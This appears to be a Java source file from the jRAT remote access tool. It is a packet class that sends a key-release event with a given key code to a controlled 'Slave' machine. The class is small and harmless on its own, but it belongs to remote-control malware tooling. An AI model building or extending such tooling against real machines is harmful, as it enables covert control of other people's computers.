package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet95KeyRelease extends AbstractOutgoingPacket {

	private int keyCode;

	public Packet95KeyRelease(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(keyCode);
	}

	@Override
	public byte getPacketId() {
		return 95;
	}

}
